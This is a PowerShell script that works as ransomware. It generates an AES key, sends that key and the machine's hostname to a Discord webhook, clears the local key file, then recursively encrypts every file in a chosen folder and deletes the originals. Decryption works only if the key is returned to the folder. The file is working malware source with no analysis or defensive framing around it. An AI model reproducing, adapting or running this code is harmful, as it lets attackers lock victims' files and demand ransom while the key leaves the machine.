function E-D {
    param (
        [Parameter(Mandatory=$true, ParameterSetName="Encrypt")]
        [switch]$e,

        [Parameter(Mandatory=$true, ParameterSetName="Decrypt")]
        [switch]$d,

        [Parameter(Mandatory=$true)]
        [string]$p,

        [Parameter(Mandatory=$true, ParameterSetName="Encrypt")]
        [string]$wh
    )

    function SendToDiscord($webhook, $message, $hostname) {
		$body = @{
			content = "**Hostname:** $hostname `n**Key:** $message"
		} | ConvertTo-Json
		
		try {
			Invoke-RestMethod -Uri $webhook -Method POST -Body $body -ContentType 'application/json'
			return $true
		} catch {
			Write-Host "Failed to send message to Discord: $_"
			return $false
		}
	}


    $hostname = [System.Environment]::MachineName

    function EncryptFile($inputFile, $outputFile, $aes) {
        $aesEncryptor = $aes.CreateEncryptor()

        $bytesToBeEncrypted = [System.IO.File]::ReadAllBytes($inputFile)
        $bytesEncrypted = $aesEncryptor.TransformFinalBlock($bytesToBeEncrypted, 0, $bytesToBeEncrypted.Length)

        [System.IO.File]::WriteAllBytes($outputFile, $bytesEncrypted)
        Remove-Item $inputFile
    }

    function DecryptFile($inputFile, $outputFile, $aes) {
        $aesDecryptor = $aes.CreateDecryptor()

        $bytesToBeDecrypted = [System.IO.File]::ReadAllBytes($inputFile)
        $bytesDecrypted = $aesDecryptor.TransformFinalBlock($bytesToBeDecrypted, 0, $bytesToBeDecrypted.Length)

        [System.IO.File]::WriteAllBytes($outputFile, $bytesDecrypted)
        Remove-Item $inputFile
    }

    $key = New-Object byte[] 32
    $iv = New-Object byte[] 16
    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider

    if ($e) {
		$aes.GenerateKey()
		$aes.GenerateIV()
		$key = $aes.Key
		$iv = $aes.IV

		$passwordText = [Convert]::ToBase64String($key) + "|" + [Convert]::ToBase64String($iv)
		Set-Content -Path "$p\key.txt" -Value $passwordText

		$webhookSuccess = SendToDiscord $wh $passwordText $hostname

		if ($webhookSuccess) {
			Clear-Content "$p\key.txt"

			Get-ChildItem -Path $p -Recurse -File | Where-Object { $_.Name -ne "key.txt" } | ForEach-Object {
				EncryptFile $_.FullName ($_.FullName + ".enc") $aes
			}
		} else {
			Write-Host "Invalid Webhook. Aborting encryption."
			# Optionally, remove the key file if the webhook is invalid.
			Remove-Item "$p\key.txt" 
		}
	}



    if ($d) {
        $keyPath = "$p\key.txt"
        if (Test-Path $keyPath) {
            $passwordText = Get-Content $keyPath

            # Check if the key and IV are not empty
            if ($passwordText -eq $null -or $passwordText.Split("|").Count -ne 2) {
                Write-Host "Invalid or empty key and/or IV. Aborting decryption."
                return
            }

            $key = [Convert]::FromBase64String($passwordText.Split("|")[0])
            $iv = [Convert]::FromBase64String($passwordText.Split("|")[1])

            # Check for correct key and IV length
            if ($key.Length -ne 32 -or $iv.Length -ne 16) {
                Write-Host "Invalid key or IV length. Aborting decryption."
                return
            }

            $aes.Key = $key
            $aes.IV = $iv

            try {
                Get-ChildItem -Path $p -Recurse -File | Where-Object { $_.Extension -eq ".enc" } | ForEach-Object {
                    DecryptFile $_.FullName ($_.FullName -replace ".enc$", "") $aes
                }
            } catch {
                Write-Host "An error occurred during decryption: $_. Aborting decryption."
            }
        } else {
            Write-Host "The key file is not located in the directory. Aborting decryption."
        }
    }
}

#E-D -e -p "C:\Users\$env:USERNAME\Documents\test\" -wh "YOUR WEBHOOK HERE"

#E-D -d -p "C:\Users\$env:USERNAME\Documents\test\"
